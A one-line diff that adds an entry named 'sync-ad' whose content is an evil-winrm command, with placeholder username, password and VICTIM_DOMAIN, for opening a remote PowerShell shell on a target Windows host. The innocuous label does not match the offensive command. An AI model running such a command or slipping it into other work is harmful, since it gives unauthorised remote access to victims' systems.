@@ -1,0 +1,1 @@
+sync-ad evil-winrm -u 'USERNAME' -p 'PASSWORD' -i VICTIM_DOMAIN
